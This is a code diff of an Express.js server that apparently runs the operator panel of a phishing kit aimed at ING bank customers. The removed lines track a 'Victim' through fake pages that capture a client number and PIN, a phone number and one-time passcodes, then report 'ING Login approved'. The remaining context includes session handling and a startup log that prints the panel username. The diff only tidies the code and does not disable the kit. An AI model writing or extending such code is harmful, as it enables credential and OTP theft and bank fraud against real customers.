@@ -12,16 +12,12 @@ const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toSt
 const app  = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS });   // leave in for now
-
-// Trust proxy – required behind Railway / Render
 app.set('trust proxy', 1);
 
 app.use(cors());
-app.use(express.json());                       // modern body parser
-app.use(express.urlencoded({ extended: true })); // <<-- this was missing / too late
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// Session middleware – MUST be before routes
 app.use(session({
   name: 'pan_sess',
   keys: [SESSION_SECRET],
@@ -97,22 +93,6 @@ function uaParser(ua) {
   if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
   if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
   return u;
-}
-
-function getSessionHeader(v) {
-  if (v.page === 'success') return `🦁 ING Login approved`;
-  if (v.status === 'approved') return `🦁 ING Login approved`;
-  if (v.page === 'index.html') {
-    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-  } else if (v.page === 'verify.html') {
-    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-  } else if (v.page === 'unregister.html') {
-    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
-  } else if (v.page === 'otp.html') {
-    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
-    return `🔑 Awaiting OTP...`;
-  }
-  return `🔑 Awaiting OTP...`;
 }
 
 function cleanupSession(sid, reason, silent = false) {
@@ -369,3 +349,4 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
+
